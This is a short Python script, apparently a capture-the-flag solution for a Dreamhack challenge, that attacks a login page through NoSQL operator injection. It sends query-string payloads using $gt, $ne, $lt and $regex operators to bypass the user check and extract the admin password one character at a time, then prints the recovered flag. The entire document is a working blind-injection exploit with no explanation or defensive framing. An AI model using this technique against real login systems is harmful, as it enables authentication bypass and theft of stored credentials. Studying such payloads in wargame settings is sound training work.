import requests
import string
 
url = "http://host1.dreamhack.games:22637/login"
s = string.digits + string.ascii_uppercase + string.ascii_lowercase + "{}"
 
result = ""
for i in range(32):
    for idx, c in enumerate(s):
        payload = "?uid[$gt]=adm&uid[$ne]=guest&uid[$lt]=d&upw[$regex]={" + (result+c)
        print(payload)
        res = requests.get(url+payload)
        
        if res.text.find("admin") != -1:
            result += s[idx]
            print(result)
            break
 
flag = "DH" + result + "}"
 
print(flag)
